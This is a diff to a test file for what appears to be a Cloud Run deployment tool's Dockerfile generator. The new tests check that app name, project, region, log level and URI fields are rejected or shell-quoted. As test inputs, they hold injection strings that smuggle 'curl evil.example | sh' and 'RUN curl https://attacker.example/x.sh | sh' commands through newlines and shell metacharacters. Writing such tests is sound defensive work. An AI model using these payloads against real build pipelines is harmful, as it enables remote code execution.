@@ -14,6 +14,7 @@ import {
 import {A2A_AUTH_TOKEN_ENV_VAR} from '../../src/server/adk_api_server.js';
 import {AgentLoader} from '../../src/utils/agent_loader.js';
 import {
+  createTempDir,
   isFile,
   isFolderExists,
   loadFileData,
@@ -57,6 +58,7 @@ vi.mock('../../src/utils/agent_loader.js', () => ({
 }));
 
 vi.mock('../../src/utils/file_utils.js', () => ({
+  createTempDir: vi.fn(),
   isFile: vi.fn(),
   isFolderExists: vi.fn(),
   loadFileData: vi.fn(),
@@ -109,8 +111,104 @@ describe('createDockerFileContent', () => {
       allowOrigins: 'http://example.com',
       otelToCloud: true,
     });
-    expect(content).toContain('--allow_origins=http://example.com');
+    expect(content).toContain("--allow_origins='http://example.com'");
     expect(content).toContain('--otel_to_cloud');
+  });
+
+  it('should reject logLevel/allowOrigins/sessionServiceUri/artifactServiceUri containing a newline', () => {
+    // These reach the shell-interpreted CMD line via adkServerOptions, so a
+    // newline in any of them breaks out of that Dockerfile instruction the
+    // same way appName/project/region do.
+    for (const [label, value] of [
+      ['logLevel', {logLevel: 'info\nRUN sh -c "curl evil.example|sh"\n#'}],
+      [
+        'allowOrigins',
+        {allowOrigins: 'http://a\nRUN sh -c "curl evil.example|sh"\n#'},
+      ],
+      [
+        'sessionServiceUri',
+        {sessionServiceUri: 'memory://\nRUN sh -c "curl evil.example|sh"\n#'},
+      ],
+      [
+        'artifactServiceUri',
+        {artifactServiceUri: 'gs://b\nRUN sh -c "curl evil.example|sh"\n#'},
+      ],
+    ] as const) {
+      expect(() =>
+        createDockerFileContent({...defaultOptions, ...value}),
+      ).toThrow(new RegExp(`Invalid ${label}`));
+    }
+  });
+
+  it('should shell-quote logLevel/allowOrigins/sessionServiceUri/artifactServiceUri in the CMD line', () => {
+    // These values reach /bin/sh at container start via the CMD line's
+    // shell form, so shell metacharacters must be neutralized by quoting.
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      logLevel: 'info; curl evil.example | sh #',
+      sessionServiceUri: 'memory://; curl evil.example | sh #',
+      artifactServiceUri: 'gs://bucket; curl evil.example | sh #',
+    });
+    expect(content).toContain("--log_level='info; curl evil.example | sh #'");
+    expect(content).toContain(
+      "--session_service_uri='memory://; curl evil.example | sh #'",
+    );
+    expect(content).toContain(
+      "--artifact_service_uri='gs://bucket; curl evil.example | sh #'",
+    );
+  });
+
+  it('should escape an embedded single quote when shell-quoting', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      logLevel: "info'; curl evil.example | sh #",
+    });
+    expect(content).toContain(
+      "--log_level='info'\\''; curl evil.example | sh #'",
+    );
+  });
+
+  it('should reject an appName that would break out of the generated Dockerfile', () => {
+    // A newline lets an attacker-controlled agent directory name terminate
+    // the COPY instruction it's embedded in and start a new Dockerfile
+    // instruction (e.g. RUN), executed during `docker build`.
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        appName: 'x"\nRUN curl https://attacker.example/x.sh | sh\n#',
+      }),
+    ).toThrow(/Invalid appName/);
+  });
+
+  it('should reject a project that would break out of the generated Dockerfile', () => {
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        project: 'p\nRUN curl https://attacker.example/x.sh | sh\n#',
+      }),
+    ).toThrow(/Invalid project/);
+  });
+
+  it('should reject a region that would start a new Dockerfile instruction', () => {
+    // region only reaches the ENV GOOGLE_CLOUD_LOCATION= line, not the
+    // shell-interpreted CMD line, so the vector here is a newline breaking
+    // out of that instruction, not a shell metacharacter.
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        region: 'us-central1\nRUN curl https://attacker.example/x.sh | sh\n#',
+      }),
+    ).toThrow(/Invalid region/);
+  });
+
+  it('should still accept appName/project/region containing dots, dashes, and underscores', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      appName: 'my-agent_v2.1',
+      project: 'my-project.example-123',
+    });
+    expect(content).toContain('agents/my-agent_v2.1/');
+    expect(content).toContain('GOOGLE_CLOUD_PROJECT=my-project.example-123');
   });
 });
 
@@ -247,6 +345,22 @@ describe('deployToCloudRun', () => {
     );
   });
 
+  it('should create a private temp folder when none is supplied', async () => {
+    const createdTempFolder = '/tmp/cloud_run_deploy_src-abc123';
+    (createTempDir as Mock).mockResolvedValue(createdTempFolder);
+
+    await deployToCloudRun({...defaultOptions, tempFolder: undefined});
+
+    expect(createTempDir).toHaveBeenCalledWith('cloud_run_deploy_src');
+    expect(spawnMock.mock.calls[0][1]).toContain(createdTempFolder);
+    expect(isFolderExists).not.toHaveBeenCalled();
+    expect(fs.rm).toHaveBeenCalledTimes(1);
+    expect(fs.rm).toHaveBeenCalledWith(createdTempFolder, {
+      recursive: true,
+      force: true,
+    });
+  });
+
   it('should clean up existing temp folder before deploying', async () => {
     (isFolderExists as Mock).mockResolvedValue(true);
 
@@ -331,6 +445,19 @@ describe('deployToCloudRun', () => {
       ).rejects.toThrow(/conflict with ADK's automatic configuration/);
     },
   );
+
+  it('should not create a temp folder when the gcloud args are rejected', async () => {
+    await expect(
+      deployToCloudRun({
+        ...defaultOptions,
+        tempFolder: undefined,
+        extraGcloudArgs: ['--project=other'],
+      }),
+    ).rejects.toThrow(/conflict with ADK's automatic configuration/);
+
+    expect(createTempDir).not.toHaveBeenCalled();
+    expect(fs.rm).not.toHaveBeenCalled();
+  });
 
   it('should still allow user env-var flags when no A2A token is given', async () => {
     await deployToCloudRun({
